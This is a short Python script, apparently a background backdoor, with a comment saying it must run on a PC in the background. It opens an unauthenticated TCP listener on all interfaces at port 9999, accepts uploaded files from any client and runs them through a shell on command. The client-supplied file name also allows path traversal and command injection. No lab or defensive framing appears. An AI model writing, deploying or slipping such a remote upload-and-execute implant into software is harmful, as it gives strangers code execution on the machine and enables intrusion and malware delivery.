# THIS NEEDS TO BE ON A PC AND ACTIVE IN THE BACKGROUND!
import socket
import threading
import subprocess
import os

UPLOAD_DIR = 'uploads/'  # Directory to save uploaded files

if not os.path.exists(UPLOAD_DIR):
    os.makedirs(UPLOAD_DIR)

def handle_client(client_socket):
    while True:
        command = client_socket.recv(1024).decode()
        if command.lower() == 'ping':
            client_socket.send(b'Running')
        elif command.lower() == 'exit':
            break
        elif command.lower().startswith('upload '):
            file_size = int(client_socket.recv(1024).decode())
            client_socket.send(b'Ready to receive file')
            file_name = command[7:]
            with open(os.path.join(UPLOAD_DIR, file_name), 'wb') as f:
                received = 0
                while received < file_size:
                    data = client_socket.recv(1024)
                    if not data:
                        break
                    f.write(data)
                    received += len(data)
            client_socket.send(b'File uploaded')
        elif command.lower().startswith('exec '):
            file_to_run = os.path.join(UPLOAD_DIR, command[5:])
            if os.path.isfile(file_to_run):
                subprocess.Popen(file_to_run, shell=True)
                client_socket.send(b'Execution started')
            else:
                client_socket.send(b'File not found')
    client_socket.close()

def main():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(('0.0.0.0', 9999))
    server.listen(5)
    print('Listening on port 9999')
    
    while True:
        client_socket, addr = server.accept()
        print(f'Accepted connection from {addr}')
        client_handler = threading.Thread(target=handle_client, args=(client_socket,))
        client_handler.start()

if __name__ == '__main__':
    main()
